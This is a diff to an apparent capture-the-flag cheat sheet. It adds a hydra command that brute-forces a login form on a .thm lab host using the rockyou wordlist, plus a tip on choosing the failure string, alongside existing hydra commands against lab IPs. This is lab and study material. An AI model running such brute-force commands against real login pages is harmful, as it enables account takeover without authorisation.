@@ -306,6 +306,10 @@ Bruteforce command using hydra for login page
 hydra -l milesdyson -P log1.txt 10.10.229.33 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
 hydra -l fox -P /usr/share/wordlists/rockyou.txt -f 10.10.209.75 http-get
 
+Sometimes, try to use "Bad password" error code > you will find the correct one
+________________________________________________________________________________________________________
+hydra -l puppet -P /usr/share/wordlists/rockyou.txt nano.cherryontop.thm http-post-form "/login.php:username=^USER^&password=^PASS^&submit=This user doesn't exist:Bad password" -f -V
+
 hydra post form brueforce 
 -------------------------
 POST /components/user/controller.php?action=authenticate HTTP/1.1
